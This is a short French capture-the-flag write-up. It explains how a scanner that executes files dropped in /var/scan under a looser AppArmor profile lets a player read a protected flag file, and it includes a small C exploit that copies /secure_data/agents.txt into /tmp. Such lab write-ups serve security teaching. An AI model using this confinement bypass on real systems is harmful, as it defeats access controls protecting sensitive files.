# AppArmor CE

## Analyse

Le script `scanner.sh` parcourt toutes les 30 secondes `/var/scan`, execute chaque fichier executable trouvé, puis le supprime. L'execution se fait avec une transition AppArmor vers `var_scan_binary` :

```bash
timeout 10 "$binary" >> "$LOG" 2>&1 || true
rm -f "$binary"
```

Le profil `var_scan_binary` est plus permissif que celui du joueur pour la ressource interessante :

```text
/secure_data/**  r,
/tmp/**          rw,
```

En revanche, le profil `player_shell` bloque explicitement la lecture directe du flag :

```text
deny /secure_data/agents.txt r,
```

La solution consiste donc a deposer dans `/var/scan` un binaire qui lit `/secure_data/agents.txt` et recopie le contenu dans `/tmp/agent.txt`. Le joueur peut ensuite lire ce fichier sans contredire son profil AppArmor.

## Exploit

Le fichier `exploit.c` effectue exactement cette copie :

```c
#include <stdio.h>

int main(void) {
	char buf[4096];
	FILE *in  = fopen("/secure_data/agents.txt", "r");
	FILE *out = fopen("/tmp/agent.txt", "w");
	fwrite(buf, 1, fread(buf, 1, sizeof buf, in), out);
	return 0;
}
```

Une fois compile et execute par le scanner, le contenu se retrouve dans `/tmp/agent.txt`.

